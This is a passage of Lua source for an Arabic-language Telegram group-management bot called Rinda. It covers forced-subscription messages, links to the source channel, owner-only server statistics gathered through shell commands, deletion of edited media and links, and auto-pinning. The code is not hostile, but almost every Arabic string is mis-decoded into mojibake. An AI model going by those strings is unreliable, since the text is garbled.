DevRio:del(Rinda.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevRio:set(Rinda..'Rio:ChText',texxt)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุชุบููุฑ ูููุดุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู', 1, 'md')
end
if text and text:match("^โข ุชุบูุฑ ูููุดู ุงูุงุดุชุฑุงู โ$") and Sudo(msg)  or text and text:match("^ุชุบููุฑ ูููุดู ุงูุงุดุชุฑุงู$") and Sudo(msg) then  
DevRio:setex(Rinda.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
local text = 'โ๏ธฐุญุณูุง ุงุฑุณู ูููุดุฉ ุงูุงุดุชุฑุงู ุงูุฌุฏูุฏู'  
Dev_Rio(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "ุญุฐู ูููุดู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" or text == "โข ุญุฐู ูููุดู ุงูุงุดุชุฑุงู โ" then  
if not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
DevRio:del(Rinda..'Rio:ChText')
textt = "โ๏ธฐุชู ุญุฐู ูููุดุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู"
Dev_Rio(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'ูููุดู ุงูุงุดุชุฑุงู' or text == 'ุฌูุจ ูููุดู ุงูุงุดุชุฑุงู' or text == 'โข ูููุดู ุงูุงุดุชุฑุงู โ' then
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
local chtext = DevRio:get(Rinda.."Rio:ChText")
if chtext then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุดุฉ ุงูุงุดุชุฑุงู โขโฏ\n-----------------------------------------\n['..chtext..']', 1, 'md')
else
if DevRio:get(Rinda.."Rio:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Rinda.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*โ๏ธฐุจเขชู ูุชฺชุฏเขช ุชุณุชุฎุฏู ุงูุจูุช๐ !\nโ๏ธฐุงุดุชเขชู ุจููุงู ุงูุจูุช ุงูู ุดู๐ง  :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ูุชู ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู \nโ๏ธฐุงุฑุณู โข ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู ููุชุนููู ', 1, 'md')
end end end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงูููุงุฉ' and ChCheck(msg) or text == 'ููุงุฉ ุงูุณูุฑุณ' and ChCheck(msg) or text == 'ููุงู ุงูุณูุฑุณ' and ChCheck(msg) or text == 'ููุงุช ุงูุณูุฑุณ' and ChCheck(msg) or text == 'โข ููุงุฉ ุงูุณูุฑุณ โ' and ChCheck(msg) then 
Text = [[
โ๏ธฐ[ููุงุฉ ุงูุณูุฑุณ](https://t.me/Source_Rinda)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'โ ููุงุฉ ุงูุณูุฑุณ',url="t.me/Source_Rinda"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Source_Rinda&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุจุฑูุฌ ุงูุณูุฑุณ" and ChCheck(msg) or text == "ูุทูุฑ ุงูุณูุฑุณ" and ChCheck(msg) or text == "ููู ุงููุจุฑูุฌ" and ChCheck(msg) or text == "ุงููุจุฑูุฌ" and ChCheck(msg) or text == "โข ูุจุฑูุฌ ุงูุณูุฑุณ โ" and ChCheck(msg) then 
Text = [[
โ๏ธฐ[ูุจุฑูุฌ ุงูุณูุฑุณ](https://t.me/WYYYYY)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'โ ูุจุฑูุฌ ุงูุณูุฑุณ',url="t.me/WYYYYY"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/WYYYYY&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ูุนูููุงุช ุงูุณูุฑูุฑ' or text == 'ุงูุณูุฑูุฑ' or text == 'โข ุงูุณูุฑูุฑ โ' then 
if not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo 'โ๏ธฐูุธุงู ุงูุชุดุบูู โข โค\n`'"$LinuxVersion"'`' 
echo '-----------------------------------------\nโ๏ธฐุงูุฐุงูุฑู ุงูุนุดูุงุฆูู โข โค\n`'"$MemoryUsage"'`'
echo '-----------------------------------------\nโ๏ธฐูุญุฏุฉ ุงูุชุฎุฒูู โข โค\n`'"$HardDisk"'`'
echo '-----------------------------------------\nโ๏ธฐุงููุนุงูุฌ โข โค\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '-----------------------------------------\nโ๏ธฐุงูุฏุฎูู โข โค\n`'`whoami`'`'
echo '-----------------------------------------\nโ๏ธฐูุฏุฉ ุชุดุบูู ุงูุณูุฑูุฑ โข โค\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
RindaFiles(msg)
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevRio:incr(Rinda..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'ุงูููุฏูุง'
if result.content_.ID == "MessagePhoto" then Media = 'ุงูุตูุฑู'
elseif result.content_.ID == "MessageVideo" then Media = 'ุงูููุฏูู'
elseif result.content_.ID == "MessageAnimation" then Media = 'ุงููุชุญุฑูู'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local rioname = 'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local rioid = 'โ๏ธฐุงูุฏูู โข `'..dp.id_..'`'
local riotext = 'โ๏ธฐูุงู ุจุงูุชุนุฏูู ุนูู '..Media
local riotxt = '-----------------------------------------\nโ๏ธฐุชุนุงูู ูุงูุดุฑููู ุงูู ูุฎุฑุจ'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,rio) 
local admins = rio.members_  
text = '\n-----------------------------------------\n'
for i=0 , #admins do 
if not rio.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, rioname..'\n'..rioid..'\n'..riotext..text..riotxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevRio:get(Rinda..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevRio:del(Rinda..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(Rinda..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(Rinda..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(Rinda..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mุฌุงุฑู ุชูุธูู ุงููุฌููุนุงุช ุงูููููู ูุฑุฌู ุงูุงูุชุธุงุฑ\n\27[1;37m')
local PvList = DevRio:smembers(Rinda..'Rio:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevRio:smembers(Rinda..'Rio:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Rinda,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevRio:srem(Rinda..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(Rinda..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevRio:srem(Rinda..'Rio:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevRio:srem(Rinda..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevRio:sadd(Rinda..'Rio:Groups',v)  
end end,nil) end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
end 
------------------------------------------------
-- This Source Was Developed By (Rio) @tsttt.--
--   This Is The โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ @Source_Rinda .   --
--                - Rinda -                 --
--        -- https://t.me/Source_Rinda --         --
------------------------------------------------   
